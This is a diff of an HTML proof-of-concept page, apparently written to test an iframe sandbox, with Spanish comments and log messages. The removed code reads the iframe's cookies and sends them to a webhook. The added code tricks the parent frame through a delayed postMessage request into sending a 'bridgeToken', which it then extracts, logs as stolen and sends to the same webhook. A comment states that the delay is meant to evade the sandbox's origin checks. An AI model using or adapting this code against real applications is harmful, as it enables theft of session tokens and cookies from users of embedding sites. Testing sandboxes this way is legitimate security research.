@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h2>Cookie Leak Test</h2>
-    <pre id="log" style="background:#000; color:#0f0; padding:10px;"></pre>
+    <h2>Token Replay Async</h2>
+    <pre id="log" style="background:#000; color:#0f0; padding:10px; min-height:100px;"></pre>
 
     <script>
         const logEl = document.getElementById('log');
@@ -12,32 +12,31 @@
             logEl.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
         }
 
-        log("Origen actual: " + window.location.origin);
-        log("¿Es Top Frame? " + (window.self === window.top));
+        // 1. Escuchar mensajes del padre
+        window.addEventListener("message", (event) => {
+            const dataString = JSON.stringify(event.data);
+            log(`📩 Mensaje de ${event.origin}: ${dataString}`);
 
-        // 1. Leemos TODAS las cookies actuales del iframe
-        const cookies = document.cookie;
-        log("Cookies actuales del iframe: " + (cookies || "(vacío)"));
-        
-        // 2. Si hay cookies, intentamos leerlas con la Cookie Store API
-        if (window.cookieStore) {
-            window.cookieStore.getAll().then((cookiesArray) => {
-                log("Cookie Store API: " + JSON.stringify(cookiesArray));
-                
-                // Si hay cookies, las exfiltramos
-                if (cookiesArray.length > 0) {
+            if (dataString.includes("bridgeToken")) {
+                const match = dataString.match(/"bridgeToken":"([^"]+)"/);
+                if (match) {
+                    const token = match[1];
+                    log(`🔑 Token robado: ${token}`);
+                    // Exfiltrar
                     const img = new Image();
-                    img.src = `${webhookUrl}?real_cookies=true&data=${encodeURIComponent(JSON.stringify(cookiesArray))}`;
-                    log("📤 ¡Cookies reales exfiltradas al webhook!");
-                } else {
-                    log("No hay cookies reales en el iframe.");
+                    img.src = `${webhookUrl}?async_token=${encodeURIComponent(token)}`;
                 }
-            }).catch((e) => {
-                log("Error en Cookie Store API: " + e.message);
-            });
-        } else {
-            log("Cookie Store API no disponible.");
-        }
+            }
+        });
+
+        // 2. Forzar al padre a enviar el token usando una llamada ASÍNCRONA
+        // (El Sandbox no puede rastrear el origen de las llamadas por temporizador)
+        setTimeout(() => {
+            log("Enviando petición asíncrona al padre...");
+            window.parent.postMessage({ type: "cvm-bridge:request-document" }, "*");
+        }, 1000);
+
+        log("Listener activo. Esperando token...");
     </script>
 </body>
 </html>
